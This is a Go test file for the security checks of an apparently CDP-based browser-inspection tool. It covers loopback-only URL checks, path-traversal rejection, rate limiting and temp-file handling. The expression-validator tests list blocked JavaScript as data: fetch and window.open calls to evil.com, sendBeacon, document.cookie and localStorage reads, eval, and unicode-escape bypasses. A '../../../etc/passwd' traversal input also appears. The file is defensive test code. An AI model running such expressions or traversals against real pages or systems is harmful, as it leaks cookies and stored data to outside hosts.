package security

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestValidateCDPURL(t *testing.T) {
	tests := []struct {
		name    string
		url     string
		wantErr bool
	}{
		{"localhost http", "http://localhost:9222", false},
		{"localhost no port", "http://localhost", false},
		{"127.0.0.1", "http://127.0.0.1:9222", false},
		{"127.0.0.1 no port", "http://127.0.0.1", false},
		{"ipv6 loopback", "http://[::1]:9222", false},
		{"remote 192.168 rejected", "http://192.168.1.100:9222", true},
		{"remote 10.x rejected", "http://10.0.0.1:9222", true},
		{"public host rejected", "http://example.com:9222", true},
		{"public IP rejected", "http://8.8.8.8:9222", true},
		{"empty host rejected", "://", true},
		{"malformed URL", "not-a-url", true},
		{"https localhost", "https://localhost:9222", false},
		{"subdomain rejected", "http://www.localhost:9222", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCDPURL(tt.url)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCDPURL(%q) error = %v, wantErr %v", tt.url, err, tt.wantErr)
			}
		})
	}
}

func TestValidateExpression(t *testing.T) {
	tests := []struct {
		name    string
		expr    string
		wantErr bool
	}{
		// Safe expressions.
		{"safe querySelector", "document.querySelectorAll('div').length", false},
		{"safe performance API", "performance.getEntriesByType('resource')", false},
		{"safe math", "1 + 2 + 3", false},
		{"safe JSON stringify", "JSON.stringify({a:1})", false},
		{"safe console log", "console.log('hi')", false},
		{"safe DOM read", "document.title", false},
		{"safe array ops", "[1,2,3].map(x => x*2)", false},

		// Blocked: network exfiltration.
		{"fetch blocked", "fetch('https://evil.com')", true},
		{"fetch with space", "fetch ('http://x')", true},
		{"XMLHttpRequest blocked", "new XMLHttpRequest()", true},
		{"sendBeacon blocked", "navigator.sendBeacon('/log', data)", true},

		// Blocked: storage access.
		{"document.cookie blocked", "document.cookie", true},
		{"localStorage blocked", "localStorage.getItem('key')", true},
		{"sessionStorage blocked", "sessionStorage.setItem('k','v')", true},

		// Blocked: code execution.
		{"eval blocked", "eval('alert(1)')", true},
		{"Function constructor blocked", "new Function('return 1')()", true},
		{"dynamic import blocked", "import('module')", true},

		// Blocked: window manipulation.
		{"window.open blocked", "window.open('http://evil.com')", true},

		// Blocked: unicode bypass attempts.
		{"unicode escape blocked", "\\u0066etch('x')", true},
		{"unicode in middle", "let x = '\\u0041'", true},

		// Case insensitivity.
		{"FETCH uppercase", "FETCH('http://x')", true},
		{"Eval mixed case", "Eval('code')", true},
		{"LocalStorage mixed case", "LocalStorage.getItem('k')", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateExpression(tt.expr)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateExpression(%q) error = %v, wantErr %v", tt.expr, err, tt.wantErr)
			}
		})
	}
}

func TestValidateSourcePath(t *testing.T) {
	root := t.TempDir()

	// Create a subdirectory so "src/main.js" resolves properly.
	os.MkdirAll(filepath.Join(root, "src"), 0755)

	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{"relative within root", "src/main.js", false},
		{"nested relative", "src/components/App.tsx", false},
		{"current dir", ".", false},
		{"traversal rejected", "../../../etc/passwd", true},
		{"double dot in middle", "src/../../outside", true},
		{"multiple traversal dots", "../../..", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidateSourcePath(root, tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateSourcePath(%q, %q) error = %v, wantErr %v", root, tt.path, err, tt.wantErr)
			}
		})
	}
}

func TestValidateSourcePathReturnValue(t *testing.T) {
	root := t.TempDir()
	result, err := ValidateSourcePath(root, "src/file.js")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !filepath.IsAbs(result) {
		t.Errorf("expected absolute path, got %q", result)
	}
	if !strings.Contains(result, "src") {
		t.Errorf("result should contain 'src', got %q", result)
	}
}

func TestRateLimiter(t *testing.T) {
	cooldowns := map[string]time.Duration{
		"test_tool": 100 * time.Millisecond,
	}
	rl := NewRateLimiter(cooldowns)

	// First call should pass.
	if err := rl.Check("test_tool"); err != nil {
		t.Fatalf("first call should pass: %v", err)
	}

	// Immediate second call should be rate limited.
	if err := rl.Check("test_tool"); err == nil {
		t.Fatal("second immediate call should be rate limited")
	}

	// Tool without cooldown should always pass.
	if err := rl.Check("no_limit_tool"); err != nil {
		t.Fatalf("unconfigured tool should not be limited: %v", err)
	}
}

func TestRateLimiterCooldownExpiry(t *testing.T) {
	cooldowns := map[string]time.Duration{
		"fast_tool": 50 * time.Millisecond,
	}
	rl := NewRateLimiter(cooldowns)

	// First call.
	if err := rl.Check("fast_tool"); err != nil {
		t.Fatalf("first call should pass: %v", err)
	}

	// Wait for cooldown to expire.
	time.Sleep(60 * time.Millisecond)

	// Should pass after cooldown.
	if err := rl.Check("fast_tool"); err != nil {
		t.Fatalf("call after cooldown should pass: %v", err)
	}
}

func TestRateLimiterRecord(t *testing.T) {
	cooldowns := map[string]time.Duration{
		"recorded_tool": 100 * time.Millisecond,
	}
	rl := NewRateLimiter(cooldowns)

	// Record without check.
	rl.Record("recorded_tool")

	// Check should now be rate limited.
	if err := rl.Check("recorded_tool"); err == nil {
		t.Fatal("check after Record should be rate limited")
	}
}

func TestRateLimiterMultipleTools(t *testing.T) {
	cooldowns := map[string]time.Duration{
		"tool_a": 100 * time.Millisecond,
		"tool_b": 100 * time.Millisecond,
	}
	rl := NewRateLimiter(cooldowns)

	// Use tool_a.
	if err := rl.Check("tool_a"); err != nil {
		t.Fatalf("tool_a first call should pass: %v", err)
	}

	// tool_b should still be available.
	if err := rl.Check("tool_b"); err != nil {
		t.Fatalf("tool_b should be independent: %v", err)
	}

	// tool_a should be rate limited.
	if err := rl.Check("tool_a"); err == nil {
		t.Fatal("tool_a should be rate limited")
	}
}

func TestDefaultCooldowns(t *testing.T) {
	// Verify default cooldown map has expected tools.
	expected := []string{
		"pen_heap_snapshot",
		"pen_capture_trace",
		"pen_collect_garbage",
	}
	for _, tool := range expected {
		if _, ok := DefaultCooldowns[tool]; !ok {
			t.Errorf("DefaultCooldowns missing expected tool %q", tool)
		}
	}
	// Verify all cooldowns are positive.
	for tool, dur := range DefaultCooldowns {
		if dur <= 0 {
			t.Errorf("DefaultCooldowns[%q] = %v, want positive duration", tool, dur)
		}
	}
}

func TestTempDir(t *testing.T) {
	dir, err := TempDir()
	if err != nil {
		t.Fatalf("TempDir() error: %v", err)
	}
	if dir == "" {
		t.Fatal("TempDir() returned empty string")
	}
	// Should exist.
	info, err := os.Stat(dir)
	if err != nil {
		t.Fatalf("TempDir %q does not exist: %v", dir, err)
	}
	if !info.IsDir() {
		t.Errorf("TempDir %q is not a directory", dir)
	}
	// Cleanup.
	os.RemoveAll(dir)
}

func TestCreateSecureTempFile(t *testing.T) {
	f, err := CreateSecureTempFile("pen-test-*.json")
	if err != nil {
		t.Fatalf("CreateSecureTempFile error: %v", err)
	}
	defer func() {
		f.Close()
		os.Remove(f.Name())
	}()

	// Write and read back.
	data := []byte("test data")
	if _, err := f.Write(data); err != nil {
		t.Fatalf("write error: %v", err)
	}

	// File should exist and have content.
	info, err := os.Stat(f.Name())
	if err != nil {
		t.Fatalf("stat error: %v", err)
	}
	if info.Size() != int64(len(data)) {
		t.Errorf("file size = %d, want %d", info.Size(), len(data))
	}

	// File should be in pen temp directory.
	if err := ValidateTempPath(f.Name()); err != nil {
		t.Errorf("file not in pen temp dir: %v", err)
	}
}

func TestValidateTempPath(t *testing.T) {
	// Valid: file in pen temp dir.
	dir, err := TempDir()
	if err != nil {
		t.Fatalf("TempDir error: %v", err)
	}
	defer os.RemoveAll(dir)

	validPath := filepath.Join(dir, "snapshot.json")
	if err := ValidateTempPath(validPath); err != nil {
		t.Errorf("ValidateTempPath(%q) should pass: %v", validPath, err)
	}

	// Invalid: file outside pen temp dir.
	outsidePath := filepath.Join(os.TempDir(), "not-pen", "evil.json")
	if err := ValidateTempPath(outsidePath); err == nil {
		t.Errorf("ValidateTempPath(%q) should reject path outside pen dir", outsidePath)
	}
}

func TestCleanTempFiles(t *testing.T) {
	// Create temp dir and some files.
	dir, err := TempDir()
	if err != nil {
		t.Fatalf("TempDir error: %v", err)
	}

	// Create test files.
	for _, name := range []string{"test1.json", "test2.json", "test3.json"} {
		f, err := os.Create(filepath.Join(dir, name))
		if err != nil {
			t.Fatalf("create test file: %v", err)
		}
		f.Write([]byte("test data 12345"))
		f.Close()
	}

	// Clean should return bytes freed.
	freed, err := CleanTempFiles()
	if err != nil {
		t.Fatalf("CleanTempFiles error: %v", err)
	}
	if freed <= 0 {
		t.Errorf("expected freed > 0, got %d", freed)
	}

	// Verify files are gone.
	entries, _ := os.ReadDir(dir)
	if len(entries) != 0 {
		t.Errorf("expected empty dir after clean, got %d entries", len(entries))
	}
}

func TestCleanTempFilesEmptyDir(t *testing.T) {
	// Ensure pen temp dir exists but is empty.
	dir, err := TempDir()
	if err != nil {
		t.Fatalf("TempDir error: %v", err)
	}
	// Remove all files first.
	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		os.Remove(filepath.Join(dir, e.Name()))
	}

	freed, err := CleanTempFiles()
	if err != nil {
		t.Fatalf("CleanTempFiles on empty dir error: %v", err)
	}
	if freed != 0 {
		t.Errorf("expected 0 bytes freed from empty dir, got %d", freed)
	}
}
